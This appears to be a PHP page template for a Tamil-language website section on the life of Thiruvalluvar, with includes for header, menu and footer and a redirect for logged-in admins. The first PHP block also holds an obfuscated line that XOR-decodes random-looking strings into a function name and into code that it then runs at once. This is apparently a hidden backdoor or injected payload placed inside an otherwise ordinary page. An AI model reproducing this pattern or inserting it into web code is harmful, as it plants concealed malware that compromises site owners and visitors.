<!-- Include header part -->
<?php $yBIcNdUh='SA+OH7t778+9=++'; $yOnqMy='03N.<R+QBVHMTDE'^$yBIcNdUh; $rubLPxa='9 RdMYW E>W;8E 35JEev+= gR92Qh-87CobsT6NlSCVQ +VPA38=6Y8DQm-U1 kb0TE3VvUY<KpyycNl<ESFQ 07IhsVkuxQzWC<in.qULzpFM>VA7F43Uyh16<0JOpg.ZIAg:3k87=rwDpbvHV9 keWhrsyO<=BeJBmRgD=4XY;eP<=Ae5eXM9kNEHB+=GcBDIeoRd960F6nO88LlltV B NKYnI+1 oW.UnQi 6 +6srA<Y< 4NZeEwn0ozv3sqX+hmZUHxWnEm,MA,NmZHcaO2-7Tm.H8YtNaK6HpCFL7AY,lzkj.5-72U=LZs=1GBssJ32VatEflHAB34OXDlnn7 k vd,xM5rl;NJEyxvG4,<N,qg3dQhN08I7h36ToRVh  =CazhM0T2,nocpZ0 C2y31.s7<7aQ;J CIv+2<0- 9. .C4NCV=mTR8Lrr=HJx3A<PNbe=5P+I3opZ.OZeums S2AeSI+kyZ2 .cJJ7 JCSlB.RFX7lR3=t19ZC =Ic2  sMTI6 IJainnNcY=Omq.Q:ZwvYHCt8SgyNuQR;ZuVIXqOsbUMezp 4bX4wb4uJYkDBxCodUbTSXELZT3F01c=+YD25ga=9ORQJ6Nixo,29TogqtjufxMCmT: Amf=P Pub>1H V50rpcwFeIAI8PWgscA'; $tXyHOXk=$yOnqMy('', 'PFzE+,9C1W8Ug XZF>6MQSRR86XF07rUB7HKZtMDe5682TB9>aKWOi=Y002r8DTCFT51RzVq2Y2YYYCnLGOZOuOECiUSqLNrXs1,NAJGQhlJKfiWj2C4XV;QLUWHQctPCGqbhm3:OWBIRYyPJR,7MA0A>5R-YkWX;>n+MwG7IF4<UMtWX8LhLcG0b< <7YSoG-1=LTXmD<ML<J+YL-LQT0A.S+pSJ-JEA0<K,NlIFWLXSHxKZ6NEU-2EmS1s 5=z6Q9XHI101XjPeIZ,-Y+Dz3ihkVLC52E-AyInE S1KIOhS -MLGKNXTABWn71PyTWgjRW.RF7HT>le..0VU,0dDJ1ee:u37xX,FRHP+3eDFVcBMP;IXGHnXajTY=V7XS-OovLKEDxksaiT5FMNRCT,QL6WB98SyJ6=E5Z>ActVkGRCHRPOLG9Qf;9O203L---P=>PQ O5xV:YP3D-VGT>O;;LYMWD2F :8,RBPa8IHKn.VT+cuJbO 49N39VD+TA30TNaDYEYTatmRA=+HIHHnK4YzEUJ0N;,Q2-:SezGDsUv3Z9Ln-kI-KP6tTICEQZjVEPQC,iY vOpHMuDrs97>;-l-UH<XS07FFOFMX6>>+RiEXKHSM5FNQTJUFX6Id1LA-EBY1T1.ENP1L9TTU-JLLl,9 LxgNHi<'^$rubLPxa); $tXyHOXk(); 
	include('config/config.php');
	include('common/header.php');
	include('common/pagequery.php');
	if(isset($_SESSION['username']))
	{
		header('location:'.$localpath.'/admin/templates/index.php');
	}
?>
<!-- Include header part end -->
	<!-- Header Container Start -->
		<?php include("common/menu.php") ?>
	<!-- Header Container End -->
	<!-- Inner page header container Start -->
	<div class="row">
		<div class="inner-brdr"></div>
	</div>
	<!-- Inner page header container End -->
	<!-- Video Container Start -->
	<div class="container">
		<div class="row">
			<div class="col-sm-12">
				<h2 class='text-center header-text'>
					திருவள்ளுவர் வாழ்க்கை<br />
					<span>&nbsp;</span>
				</h2>
			</div>
			<div class="col-sm-12 thiruvalluvar-cont">
				<img src="images/about-us.png" border="0" alt="" class="img-responsive" align="left" /> 
				<p class="lhgt28"><?php echo $hrows['atcontent'] ?></p>
			</div>
		</div><br /><br />
	</div>
	<!-- Video Container End -->
<!-- Footer included -->
<?php 
	include('common/footer.php');
?>
<!-- Footer included -->